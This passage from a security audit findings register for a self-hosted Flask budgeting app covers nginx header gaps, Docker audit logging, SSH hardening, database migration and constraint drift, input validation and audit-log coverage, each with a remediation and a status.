  security headers nginx would add are inert for WAN
  traffic. LAN traffic through nginx:443 has them; WAN does
  not.
- **Evidence:** `scans/cloudflared-ingress.txt` shows
  `service: http://shekel-prod-app:8000`.
- **Impact:** WAN/LAN parity gap. Memory/CPU exhaustion via
  oversized payloads is bounded only by Gunicorn's
  `limit_request_line = 8190` and the 120s timeout. No
  body-size ceiling at the WAN entry point.
- **Recommendation:** Route cloudflared ingress through the
  shared nginx. Two options: (a) `service: https://nginx:443`
  with `originServerName: <domain>` and `caPool` for the
  internal cert; (b) `service: http://nginx:80` letting
  nginx's HTTPS-redirect send the request back through the
  TLS listener. Closes the parity gap; nginx becomes the
  single chokepoint for all Shekel requests.
- **Status:** Open

### F-064: Shared nginx vhost adds no security headers for Shekel

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1188
- **ASVS:** V14.4.3
- **Source:** S3 Section 1I (`reports/13-attack-surface.md`
  Section 6 finding #4)
- **Location:** `/opt/docker/nginx/conf.d/shekel.conf`
  (preserved in `scans/shared-nginx-shekel-vhost.conf.txt`)
- **Description:** The shared nginx's shekel vhost sets
  zero `add_header` directives, while the sibling
  `jellyfin.conf` adds `X-Content-Type-Options`,
  `X-Frame-Options`, `Referrer-Policy`, and
  `Permissions-Policy`. Shekel relies solely on Flask's
  headers (`app/__init__.py:409-428`). If Flask ever serves
  a 502 or a static error page without going through the
  after-request hook, the response goes out without any
  headers at all.
- **Evidence:** Read of
  `scans/shared-nginx-shekel-vhost.conf.txt`.
- **Impact:** Defense-in-depth gap. A 502 page from nginx
  during app restart lacks X-Frame-Options or
  X-Content-Type-Options and is framable / mime-sniffable.
- **Recommendation:** Add to the nginx shekel vhost
  (matching the jellyfin pattern):
  ```
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-Frame-Options "DENY" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
  ```
  Use `always` so headers are emitted even on error pages.
  Requires F-021 remediation (commit the nginx config to the
  repo).
- **Status:** Open

### F-065: No Docker daemon / container runtime audit logging

- **Severity:** Medium
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778 (Insufficient Logging)
- **ASVS:** V7.2.1
- **Source:** S2 Section 1H (`reports/12-host-hardening.md`
  F-H-03); docker-bench 1.1.3-1.1.18
- **Location:** Host auditd config (absent)
- **Description:** No auditd rules for `dockerd`, containerd,
  runc, the Docker socket, or `/var/lib/docker`. A
  compromise of the Docker daemon leaves no forensic trail.
- **Evidence:** Docker-bench output:
  ```
  1.1.3: Ensure auditing is configured for the Docker daemon -- NO
  ... (similar for 1.1.4, 1.1.5, 1.1.7, 1.1.9, 1.1.14, 1.1.17, 1.1.18)
  ```
- **Impact:** If the Docker daemon or socket is compromised
  (credential leak, host user escalation), there is no
  record of what happened, when, or by whom. Incident
  response becomes guesswork.
- **Recommendation:** Install and enable auditd. Add the
  standard Docker audit rules:
  ```
  -w /usr/bin/dockerd -k docker
  -w /var/lib/docker -k docker
  -w /run/containerd -k docker
  -w /usr/bin/containerd -k docker
  -w /usr/bin/containerd-shim-runc-v2 -k docker
  -w /usr/bin/runc -k docker
  -w /usr/lib/systemd/system/docker.service -k docker
  -w /usr/lib/systemd/system/docker.socket -k docker
  ```
- **Status:** Open

### F-066: SSH hardening opportunities -- MaxAuthTries, forwarding

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-16 (Configuration)
- **ASVS:** V14.1.1
- **Source:** S2 Section 1H (`reports/12-host-hardening.md`
  F-H-06); S3 Section 1I (`reports/13-attack-surface.md`
  Section 6 finding #9)
- **Location:** `/etc/ssh/sshd_config` on the Arch host
- **Description:** sshd is running with several defaults
  that could be tightened: `MaxAuthTries=6` (default, recommend
  3), `AllowTcpForwarding=YES` (recommend NO), `AllowAgentForwarding=YES`
  (recommend NO), `MaxSessions=10` (recommend 2). Default port 22.
  SSH is the highest-blast-radius entry on the LAN -- `josh` is
  in the `docker` group so a successful SSH landing yields
  `docker exec` into every container.
- **Evidence:** Lynis SSH-7408 flags.
- **Impact:** If SSH is brute-forceable from the LAN
  (password auth enabled, no fail2ban), a single password
  compromise grants host shell, which via `docker` group
  grants `docker exec` into `shekel-prod-db` -- direct DB
  access without needing to go through the app at all.
- **Recommendation:** In `/etc/ssh/sshd_config`:
  ```
  MaxAuthTries 3
  AllowTcpForwarding no
  AllowAgentForwarding no
  MaxSessions 2
  AllowUsers josh
  PasswordAuthentication no  # verify; key-only is safer
  PermitRootLogin no
  ```
  Install fail2ban. Consider moving SSH to a high port
  (obscurity, reduces log noise only).
- **Status:** Open

### F-067: Pending kernel reboot on host

- **Severity:** Medium
- **OWASP:** A06:2021 Vulnerable and Outdated Components
- **CWE:** CWE-1104
- **ASVS:** V14.2.2
- **Source:** S2 Section 1H (`reports/12-host-hardening.md`
  F-H-07); Lynis KRNL-5830
- **Location:** Arch host
- **Description:** The running kernel (7.0.0-1-cachyos) may
  not match the installed kernel. A reboot is needed to
  apply kernel security patches already on disk.
- **Evidence:** Lynis KRNL-5830.
- **Impact:** The host is running a kernel that is behind
  what pacman has installed. Any kernel security fix
  packaged since the last reboot is not active.
- **Recommendation:** Schedule a reboot. Before reboot, back
  up anything in-flight; coordinate a brief Shekel outage.
  Stop the stale containers from F-054 first so the post-
  reboot state is clean.
- **Status:** Open

### F-068: Boolean flag columns are nullable in live DB despite model defaults

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-1188
- **ASVS:** V13.1.4
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C3-04)
- **Location:** `budget.transactions.is_override`,
  `budget.transactions.is_deleted`, `budget.accounts.is_active`,
  `budget.scenarios.is_baseline`, `budget.recurrence_rules.is_recurring`,
  `budget.transaction_templates.sort_order`,
  `salary.paycheck_deductions.inflation_enabled` (pattern
  repeats)
- **Description:** Several boolean-flag columns declare
  `default=False` at the Python level but are `nullable=True`
  at the DB level with no `server_default`. Older rows
  inserted before the column existed may have NULL; the app
  code relies on implicit NULL→false coercion. The comparable
  columns on `budget.transfers` were correctly fixed (NOT
  NULL at both layers) -- the pattern was not applied
  consistently.
- **Evidence:** S6 compared model declarations to live DB
  `\d+` output across multiple tables.
- **Impact:** NULL in a boolean flag that the app treats as
  false means F-010 stale-form lost-update writes can
  accidentally flip the column. Queries that filter by
  `is_deleted.is_(False)` miss NULL rows (NULL is neither
  True nor False). Violates coding standard "NOT NULL by
  default."
- **Recommendation:** Migration that tightens every
  affected boolean column to `NOT NULL` with
  `server_default='false'`. Update model declarations with
  `nullable=False, server_default="false"`. Test with a
  rollback scenario against a populated snapshot.
- **Status:** Fixed in C-25 (e2b3de9, 2026-05-07).
  `app/models/transaction.py:160-167` declares `is_override` and
  `is_deleted` with `nullable=False, server_default=db.text("false")`;
  the same NOT NULL + server_default sweep applies to
  `account.is_active`, `scenario.is_baseline`, `recurrence_rule.
  is_recurring`, `paycheck_deduction.inflation_enabled` /
  `is_active`, and `transaction_template.sort_order`. The Alembic
  migration backfills NULL rows before flipping NOT NULL.

### F-069: Missing partial unique index uq_scenarios_one_baseline

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-840 (Business Logic Errors)
- **ASVS:** V13.1.4
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C3-02)
- **Location:** `budget.scenarios(user_id) WHERE
  is_baseline=TRUE` -- declared by migration #7 but missing
  from live DB
- **Description:** Migration #7 (c5d6e7f8a901) created three
  artifacts that no longer exist in the live DB: two CHECKs
  and a partial unique index `uq_scenarios_one_baseline` on
  `budget.scenarios(user_id) WHERE is_baseline=TRUE`. No
  subsequent migration drops them -- they were manually
  dropped outside Alembic or the migration partially failed.
- **Evidence:** Live DB `\d+ budget.scenarios` shows no
  `uq_scenarios_one_baseline`.
- **Impact:** The enforcement that guarantees "only one
  baseline scenario per user" is missing. Via raw SQL or a
  racy UI double-click, two baseline scenarios per user can
  coexist. The model relies on this uniqueness for
  balance-calculator scoping.
- **Recommendation:** New migration that recreates
  `uq_scenarios_one_baseline`. First verify no duplicate
  baselines exist:
  `SELECT user_id, count(*) FROM budget.scenarios WHERE
   is_baseline=TRUE AND is_deleted=FALSE GROUP BY user_id
   HAVING count(*) > 1;`. If any, resolve before creating
  the index.
- **Status:** Open

### F-070: Migration a8b1c2d3e4f5 missing CREATE SCHEMA for system

- **Severity:** Medium
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1188
- **ASVS:** V14.1.2
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C1-03)
- **Location:** `migrations/versions/a8b1c2d3e4f5_*.py`
- **Description:** The audit-log migration creates tables,
  functions, and triggers in the `system` schema but does
  NOT issue `CREATE SCHEMA IF NOT EXISTS system` first. A
  fresh DB without the schema pre-created (e.g. via
  entrypoint.sh) fails `flask db upgrade` at this migration.
  The migration is not self-contained.
- **Evidence:** Read of the migration file shows no
  schema-create statement; live DB must have had the schema
  created via some other mechanism.
- **Impact:** `flask db upgrade` on a fresh DB fails at
  this migration. Staging rebuild, disaster-recovery
  restore, new-host bring-up all break here.
- **Recommendation:** Add
  `op.execute("CREATE SCHEMA IF NOT EXISTS system")` at the
  top of `upgrade()`. Must be part of the F-028 rebuild
  migration regardless.
- **Status:** Fixed in C-13 (bf6d7a3, 2026-05-05). The rebuild
  migration `migrations/versions/a5be2a99ea14_rebuild_audit_infrastructure.py`
  starts with an idempotent `CREATE SCHEMA IF NOT EXISTS system`
  prior to creating `system.audit_log`, the trigger function, and
  the per-table triggers. Fresh-DB bringup, DR restore, and staging
  rebuild now succeed at this step.

### F-071: Migration 22b3dd9d9ed3 partial reversal on downgrade

- **Severity:** Medium
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1188
- **ASVS:** V14.1.2
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C1-04 + F-S6-C6-01)
- **Location:** `migrations/versions/22b3dd9d9ed3_*.py`
- **Description:** The upgrade mixes `create_table` (7 new
  salary tables) with `alter_column` and `drop_index` on
  pre-existing tables (drops `idx_deductions_profile`,
  `idx_salary_raises_profile`,
  `idx_tax_brackets_bracket_set`). The downgrade drops the
  new tables and reverts 4 unique-constraint renames but
  does NOT recreate the 3 dropped indexes, does NOT revert
  multiple `alter_column` type changes (nullability on
  fica_configs, name widening on salary_profiles +
  paycheck_deductions, notes TEXT→VARCHAR).
- **Evidence:** Read of the migration shows asymmetric
  upgrade/downgrade.
- **Impact:** A downgrade leaves the schema in a hybrid
  state -- neither pre-migration nor post-migration. Three
  child-FK indexes in the salary schema are missing from
  live DB (F-079). Query performance on
  `paycheck_deductions`, `salary_raises`, and
  `tax_brackets` degrades as data grows.
- **Recommendation:** Audit the downgrade method and
  reverse every structural change in upgrade. Alternatively
  (and preferable for the missing indexes), write a new
  forward migration that recreates the three indexes; see
  F-079.
- **Status:** Open

### F-072: Migration b4a6bb55f78b incomplete table rename

- **Severity:** Medium
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1188
- **ASVS:** V14.1.2
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C1-05 + F-S6-C3-03)
- **Location:** `migrations/versions/b4a6bb55f78b_*.py`;
  `budget.interest_params` (table was `hysa_params`)
- **Description:** The migration renames `hysa_params` to
  `interest_params` and renames the UNIQUE + CHECK
  constraints, but leaves the primary-key constraint
  (`hysa_params_pkey`), identity sequence
  (`hysa_params_id_seq`), and FK constraint
  (`hysa_params_account_id_fkey`) named with the legacy
  table name.
- **Evidence:** Live DB `\d+ budget.interest_params` shows
  the legacy-named PK, sequence, and FK.
- **Impact:** Cosmetic drift that confuses `pg_dump`
  output, Alembic autogenerate, and performance-tuning
  tools (`pg_stat_user_indexes` shows `hysa_params_*`
  entries that developers search for under the new name).
- **Recommendation:** Follow-up migration: `ALTER SEQUENCE
  budget.hysa_params_id_seq RENAME TO
  interest_params_id_seq; ALTER INDEX
  hysa_params_pkey RENAME TO interest_params_pkey; ALTER
  TABLE budget.interest_params RENAME CONSTRAINT
  hysa_params_account_id_fkey TO
  interest_params_account_id_fkey;`.
- **Status:** Open

### F-073: Nine ref-table FKs lack explicit ondelete=RESTRICT

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-1188
- **ASVS:** V13.1.4
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C5-01 + F-S6-C1-06)
- **Location:** `ref.account_types.category_id`;
  `budget.savings_goals.goal_mode_id/income_unit_id`;
  `salary.salary_profiles.filing_status_id`;
  `salary.salary_raises.raise_type_id`;
  `salary.paycheck_deductions.deduction_timing_id/calc_method_id`;
  `salary.tax_bracket_sets.filing_status_id`;
  `salary.state_tax_configs.tax_type_id`
- **Description:** Coding standards require
  `ondelete="RESTRICT"` on every ref-table FK. These 9
  default to implicit `NO ACTION`. Migration `047bfed04987`
  fixed budget-schema FKs but never covered salary schema or
  the post-hoc additions to savings_goals and
  account_types.
- **Evidence:** S6 live-DB `\d+` output.
- **Impact:** Standards-compliance gap. Practically, NO
  ACTION provides similar protection (refuses delete), but
  RESTRICT is immediate (fails at statement) vs
  end-of-transaction (fails at commit). The difference
  matters in complex transactions and in clarifying intent.
- **Recommendation:** New migration that drops and
  recreates each of the 9 FKs with
  `ondelete="RESTRICT"`. Model declarations updated
  accordingly.
- **Status:** Open

### F-074: SalaryProfile W-4 fields no Range validation

- **Severity:** Medium
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **ASVS:** V5.1.3
- **Source:** S5 (`reports/16-business-logic.md` M-V2); S6
  (`reports/17-migrations-schema.md` F-S6-C4-05)
- **Location:** `salary.salary_profiles.additional_income,
  additional_deductions, extra_withholding`; Marshmallow
  schemas at `app/schemas/validation.py:198-206`
- **Description:** Three fields have DB CHECK `>= 0` but no
  Marshmallow Range validator. User submits negative value;
  schema accepts; DB rejects with opaque "Failed" error.
- **Evidence:** Schema read + model read.
- **Impact:** Same class as F-011/F-012: opaque DB errors
  instead of clean 400 validation errors.
- **Recommendation:** Add `validate=validate.Range(min=0)`
  to all three fields in Create and Update schemas.
- **Status:** Fixed in C-24 (42720ca, 2026-05-07).
  `app/schemas/validation.py` SalaryProfile create/update schemas
  add `Range(min=0)` to `additional_income`,
  `additional_deductions`, and `extra_withholding` (six places
  total). The shared `_NON_NEGATIVE_MONETARY` constant centralises
  the rule for reuse.

### F-075: TaxBracketSet fields no Range validation

- **Severity:** Medium
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **ASVS:** V5.1.3
- **Source:** S5 (`reports/16-business-logic.md` M-V5)
- **Location:** `salary.tax_bracket_sets.standard_deduction,
  child_credit_amount, other_dependent_credit_amount`;
  Marshmallow `TaxBracketSetSchema`
- **Description:** Admin-facing tax config fields have DB
  CHECK `>= 0` but no Marshmallow Range. Same gap as F-074.
- **Impact:** Tax-config UI surfaces opaque errors for
  mistyped negative values.
- **Recommendation:** Add `validate=validate.Range(min=0)`
  to all three fields in `TaxBracketSetSchema`.
- **Status:** Fixed in C-24 (42720ca, 2026-05-07).
  `app/schemas/validation.py` `TaxBracketSetSchema` adds
  `Range(min=0)` on `standard_deduction`, `child_credit_amount`,
  and `other_dependent_credit_amount`; `tax_year` gains a sane
  numeric range. Aligns with the DB CHECK at the model layer.

### F-076: Missing Marshmallow validators across salary fields

- **Severity:** Medium
- **OWASP:** A03:2021 Input Validation
- **CWE:** CWE-20
- **ASVS:** V5.1.3
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C4-05) -- consolidation of the cross-schema validator
  gaps
- **Location:** See F-074/F-075 for specific columns;
  additional columns across `salary.*` schema
- **Description:** Multiple salary-schema fields have DB
  CHECKs but lack Marshmallow Range validators. Users submit
  out-of-range values; DB rejects; opaque errors.
- **Evidence:** S6 cross-reference tables.
- **Impact:** See F-074. This is the rollup covering every
  remaining field not captured in F-074/F-075.
- **Recommendation:** Extract a shared `NON_NEGATIVE_DECIMAL
  = validate.Range(min=0)` helper in the schemas module, apply
  to every field that has a matching DB CHECK. One-day sweep
  across salary schemas.
- **Status:** Fixed in C-24 (42720ca, 2026-05-07).
  `app/schemas/validation.py:86` extracts
  `_NON_NEGATIVE_MONETARY = validate.Range(min=0)` and
  `_PERCENT_INPUT_RANGE`; the C-24 sweep applies them across the
  remaining salary, FICA, investment, and tax fields. Module
  docstring documents the percent-input -> decimal-storage
  convention.

### F-077: Missing DB CHECKs on many Marshmallow-validated fields

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-1188
- **ASVS:** V13.1.4
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C4-06)
- **Location:** `escrow_components.annual_amount/inflation_rate`;
  `interest_params.apy`;
  `investment_params.annual_contribution_limit/employer_flat_percentage/employer_match_percentage/employer_match_cap_percentage`;
  `user_settings.safe_withdrawal_rate/estimated_retirement_tax_rate`;
  `paycheck_deductions.inflation_rate/inflation_effective_month`;
  `salary_raises.effective_year`;
  `state_tax_configs.standard_deduction/tax_year`;
  `calibration_overrides.effective_*_rate` (4 columns);
  `rate_history.interest_rate`
- **Description:** These fields have Marshmallow Range
  validation (or comparable) but no DB CHECK. Raw SQL,
  migrations, direct admin actions bypass the schema layer.
  F-028 + F-080 (no audit trail) + this gap = no defense at
  all against a misbehaving script.
- **Evidence:** S6 model + schema cross-reference tables.
- **Impact:** Layered-defense broken. Per coding standards,
  every Marshmallow Range rule should have a matching DB
  CHECK. The list above is the gap.
- **Recommendation:** Alembic migration adding CHECK
  constraints for all listed fields. Match Marshmallow
  bounds exactly. Single migration; tests for each
  boundary.
- **Status:** Fixed in C-24 (42720ca, 2026-05-07).
  Migration `migrations/versions/b71c4a8f5d3e_c24_marshmallow_range_check_sweep.py`
  installs the named CHECK constraints across `interest_params`,
  `escrow_components`, `investment_params`, `loan_features`,
  `paycheck_deductions`, `salary_raises`, `state_tax_configs`,
  `calibration_overrides`, and `rate_history`. Constraint names
  follow the `ck_<table>_<rule>` convention (e.g.
  `ck_interest_params_valid_apy`,
  `ck_escrow_components_nonneg_annual_amount`).

### F-078: FK naming-convention violation across the DB (49 of 52)

- **Severity:** Medium
- **OWASP:** N/A (code quality / auditability)
- **CWE:** CWE-1078 (Inappropriate Source Code Style)
- **ASVS:** N/A
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C5-02)
- **Location:** 49 of 52 FK constraints across all schemas
- **Description:** Coding standards require
  `fk_<table>_<description>` naming. Only 3 FKs in the live
  DB follow the convention. The other 49 use the Alembic
  default `<table>_<column>_fkey` pattern. Auditing is
  harder -- a grep for `fk_transactions_*` misses all
  `budget.transactions` FKs.
- **Evidence:** S6 full constraint listing.
- **Impact:** Tooling friction; grep-based auditing for
  FKs is unreliable. Retroactive rename is high-churn for
  cosmetic gain.
- **Recommendation:** Establish the convention going
  forward; update Alembic migration template or `env.py`
  `naming_convention` to enforce on new constraints. Do not
  rename existing FKs unless adjacent work already touches
  the table. Lower priority than the rest of the Medium
  findings; filed here for completeness.
- **Status:** Open

### F-079: Three salary-schema child-FK indexes dropped and not restored

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-1188
- **ASVS:** V13.1.4
- **Source:** S6 (`reports/17-migrations-schema.md`
  F-S6-C6-01)
- **Location:** `salary.paycheck_deductions(salary_profile_id)`,
  `salary.salary_raises(salary_profile_id)`,
  `salary.tax_brackets(bracket_set_id, sort_order)` --
  indexes dropped by migration `22b3dd9d9ed3`, not restored
- **Description:** Migration #5 dropped three indexes as
  part of upgrade; downgrade does not recreate them; no
  subsequent migration restores them; the models do not
  declare them. Three parent→child relationships now do
  sequential scans on every query.
- **Evidence:** Grep of models for the index names returns
  zero hits; live DB `\d+` confirms indexes absent.
- **Impact:** Query performance regression. Today's single-
  user workload masks it, but deduction/raise/bracket row
  counts grow with every year of usage; query times
  degrade linearly.
- **Recommendation:** New migration that recreates each
  index. Add matching `db.Index(...)` entries to each
  model's `__table_args__`.
- **Status:** Open

### F-080: Structured audit logging covers only 9 of 93 mutating routes

- **Severity:** Medium
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778 (Insufficient Logging)
- **ASVS:** V7.2.1, V7.2.2
- **Source:** S1 Section 1C (`reports/07-manual-deep-dives.md`
  F-1C-01); supersedes S1 F-A-07 (Low, subset)
- **Location:** `app/routes/*.py` (84-85 mutating handlers
  without `log_event`); `app/services/transfer_service.py`
  (zero `log_event` calls despite the four most sensitive
  mutation paths)
- **Description:** `methods=[...POST|PATCH|PUT|DELETE...]`
  grep of `app/routes/` returns 93 routes. `log_event(`
  grep returns 14 call sites across only 4 files (9 in
  `auth.py`, 1 in `loan.py`, 4 in services). Every
  non-auth mutation emits only bare `logger.info(...)`
  strings that cannot be queried by structured event name.
- **Evidence:**
  ```
  # Example bare log (transfer_service.py:412-417)
  logger.info(
      "Created transfer %d (%s, $%s) with shadows %d and %d.",
      xfer.id, ..., expense_shadow.id, income_shadow.id,
  )
  ```
  No `event` field, no filterable `extra={}`.
- **Impact:** Distinct from F-028 (DB-tier audit triggers).
  This is the Python-layer gap. (1) Forensic: "what
  happened to this transaction?" is unanswerable for 84-85
  of 93 mutating surfaces. (2) Compliance: a financial app
  aspiring to public release needs a queryable audit trail.
  (3) Incident response: an unexpected data change leaves
  only hand-greppable bare-log strings. (4) Standard drift:
  CLAUDE.md requires `log_event` but 14 of 60+ files in
  `app/` actually use it.
- **Recommendation:** Push `log_event` down into the service
  layer. Add calls in `transfer_service.create_transfer`,
  `update_transfer`, `delete_transfer`, `restore_transfer`;
  `category_service.*`; `account_service.*`; every other
  service module that commits a mutation. Services accept
  `user_id` explicitly; route handlers don't need to
  change. Captures mutations from routes, scripts, and
  any future background job uniformly. Pair with F-028
  (DB triggers) and F-082 (off-host shipping) for the full
  audit story.
- **Status:** Fixed in C-14 (d56458a, 2026-05-05).
  `app/utils/log_events.py:227-232` registers
  `EVT_ACCESS_DENIED_OWNER_ONLY` and `EVT_ACCESS_DENIED_CROSS_USER`
  alongside the rest of the structured-event catalogue;
  `log_event(...)` is pushed down into every mutating service
  (transactions, transfers, accounts, categories, salary, savings,
  retirement, settings) so writes from routes, scripts, and future
  jobs all emit a single canonical event. The same commit closes
  F-085 and F-144.

### F-081: No least-privilege DB role for the application

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)
- **ASVS:** V14.2.1
- **Source:** S3 Section 1J
  (`reports/14-threat-model.md` Section 7.4 "Threats with
  ZERO existing defense" #3)
- **Location:** `docker-compose.yml:59-66` DATABASE_URL
  uses the `shekel_user` role which owns the `shekel`
  database
- **Description:** The app connects as `shekel_user`, which
  is the owner of the `shekel` database. Owner role can
  issue DDL (`DROP TABLE`, `ALTER TABLE`) in addition to
  DML (SELECT/INSERT/UPDATE/DELETE). A compromised
  dependency (threat T-1) or a host-escalation attacker
  (T-5) using the DATABASE_URL from `os.environ` can
  destroy the schema, not just the data.
- **Evidence:** Read of `docker-compose.yml` and
  `scripts/*.sh` shows `POSTGRES_USER=shekel_user` in the
  DB init and in the app's `DATABASE_URL`.
- **Impact:** The blast radius of any app-level RCE
  includes schema destruction (DROP TABLE), which
  multiplies the recovery cost vs a DML-only compromise
  that at most corrupts or exfiltrates data.
- **Recommendation:** Create a separate `shekel_app`
  Postgres role with only SELECT/INSERT/UPDATE/DELETE on
  `shekel.*` schemas (no DDL, no CREATEROLE). Grant
  USAGE on the `ref` schema. Grant SELECT only on `system`
  (since F-028 + F-080 audit writes go through triggers or
  a separate tracked path). Update `DATABASE_URL` to use
  the new role. Keep `shekel_user` (owner) for migrations;
  invoke migrations explicitly with the owner-role URL,
  not the app-role URL.
- **Status:** Fixed in C-13 (bf6d7a3, 2026-05-05).
  `scripts/init_db_role.sql` provisions the `shekel_app` DML-only
  role (no DDL, no CREATEROLE) with USAGE on `ref` and SELECT-only
  on `system`. The runtime `DATABASE_URL` uses this role; migrations
  are invoked with the owner-role URL. The audit-trigger function
  is owned by the elevated role so the runtime role cannot drop or
  bypass it (load-bearing invariant for the two-role policy).

### F-082: No off-host / tamper-evident audit log shipping

- **Severity:** Medium
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778
- **ASVS:** V7.3.3, V7.3.4
- **Source:** S3 Section 1J
  (`reports/14-threat-model.md` Section 7.4 "Threats with
  ZERO existing defense" #1, called out as closing ~8
  Repudiation High cells across the threat matrix)
- **Location:** Application log volume `applogs` in
  `docker-compose.yml:78`; no shipping config anywhere
- **Description:** All application logs and the (currently
  missing, per F-028) Postgres audit triggers would land in
  the container's volume. The `applogs` volume is on the
  same host the attacker would be operating from. Threat
  T-1 (compromised dep) and T-5 (host shell) both defeat
  log integrity: the attacker rewrites or deletes log
  files after performing the action they want to hide.
- **Evidence:** No syslog config, no Loki/Promtail, no S3
  bucket, no external log sink configured in compose or
  entrypoint.
- **Impact:** Every Repudiation cell in the 1J threat model
  rated High/Critical depends on log tamper-resistance.
  Today, logs live in the DB (for audit) and in the
  container volume (for app logs) -- both reachable by
  the attacker who committed the action.
- **Recommendation:** Ship logs off-host to a tamper-
  resistant destination. Options: (a) syslog forwarding to
  a remote rsyslog server with hash-chained retention; (b)
  Grafana Loki / Promtail with object-storage backend; (c)
  S3 / Backblaze bucket with Object Lock and retention.
  Ship both `applogs` and the Postgres audit-log WAL/
  trigger output. Same remediation closes ~8 High
  Repudiation cells.
- **Status:** Fixed in C-15 (f1fc08a, 2026-05-05). Implemented
  option (b). `monitoring/promtail-config.yml` ships container
  logs to Grafana Loki on a separate container/network;
  `docker-compose.yml:201-203` documents the off-host shipping
  contract. Also closes F-150 (rewritable applogs volume) and
  F-146 (`EVT_RATE_LIMIT_EXCEEDED` registered at
  `app/utils/log_events.py:239` so 429s alert on tampering).

### F-083: verify_password silently returns False on non-string inputs

- **Severity:** Low
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-20
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-08);
  S1 Section 1C confirmed
- **Location:** `app/services/auth_service.py:276-291`
- **Description:** `verify_password` guards only for
  `plain_password is None`. Any other falsy-but-not-None
  value (empty string, empty bytes, Decimal, int) reaches
  `.encode("utf-8")` and raises `AttributeError`, which
  propagates as a 500.
- **Evidence:**
  ```python
  def verify_password(plain_password, password_hash):
      if plain_password is None:
          return False
      return bcrypt.checkpw(plain_password.encode("utf-8"), ...)
  ```
- **Impact:** Minor. Any caller passing a non-string
  produces a 500 instead of an auth failure. Not exploitable
  for auth bypass -- bcrypt.checkpw returns False correctly
  for every realistic wrong-password case. Robustness gap.
- **Recommendation:** Tighten to `if not isinstance(
  plain_password, str) or not plain_password: return False`.
  Protects against future callers passing non-string by
  mistake.
- **Status:** Open

### F-084: _assert_blocked test helper accepts 302 alongside 404

- **Severity:** Low
- **OWASP:** A01:2021 Broken Access Control (test quality)
- **CWE:** CWE-284
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-09)
- **Location:** `tests/test_integration/test_access_control.py:28-41`
- **Description:** CLAUDE.md mandates 404 for both "not
  found" and "not yours." The test helper
  `_assert_blocked(response, msg="")` accepts
  `status_code in (302, 404)`. 68 of 69 IDOR tests route
  through it. A regression that downgrades an ownership
  helper from 404 to 302 would silently pass. The helper
  also does not assert the redirect destination, so a 302
  to an attacker-controlled page would still pass.
- **Evidence:**
  ```python
  assert response.status_code in (302, 404), (
      f"Expected 302 or 404 but got {response.status_code}. ...")
  ```
- **Impact:** The test suite cannot distinguish "404 by
  ownership helper" from "302 by some other handler." The
  "404 for both" CLAUDE.md rule is not enforced by the
  tests intended to enforce it.
- **Recommendation:** Split into
  `_assert_not_found(response)` asserting 404, used for
  every ownership-helper test; and
  `_assert_redirected_to_login(response)` asserting 302 +
  login Location, used only for `@login_required`-only
  routes. Audit each of the 69 tests and move to the
  correct helper. See also F-087 for the app-side pattern
  (51 routes still use 302 for "not yours").
- **Status:** Open

### F-085: Registration uses bare logger.info instead of log_event

- **Severity:** Low
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778
- **Source:** S1 Subagent A (`reports/01-identity.md` F-A-07);
  superset in F-080
- **Location:** `app/routes/auth.py:179`
- **Description:** `/register` POST calls
  `logger.info("action=user_registered email=%s", email)`
  instead of `log_event(...)`. Every other state-changing
  auth event in the same file uses `log_event`. Breaks the
  structured-logging invariant -- a filter for "all auth
  events for user N" misses the registration row.
- **Evidence:**
  ```python
  auth_service.register_user(email, password, display_name)
  db.session.commit()
  logger.info("action=user_registered email=%s", email)
  ```
- **Impact:** The registration event is technically
  recorded but not queryable via the same filter as other
  auth events. Subset of F-080 but specific and easy to
  fix.
- **Recommendation:** Replace with
  `log_event(logger, logging.INFO, "user_registered",
  AUTH, "User registered", user_id=user.id, email=email)`.
  Capture the user object from `register_user()` return
  (currently discarded).
- **Status:** Fixed in C-14 (d56458a, 2026-05-05).
  `app/routes/auth.py` `/register` POST emits
  `EVT_USER_REGISTERED` via `log_event(...)` after the commit;
  the bare `logger.info` is gone. Same commit registers the
  event and the access-denied family in
  `app/utils/log_events.py`.

### F-086: No breached-password / reuse check on registration + change-password

- **Severity:** Low (escalates to Medium when app goes public)
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-521 (Weak Password Requirements)
- **ASVS:** V2.1.7
- **Source:** S1 Section 1C (`reports/07-manual-deep-dives.md`
  F-1C-02); S7 (`reports/18-asvs-l2.md` V2.1.7)
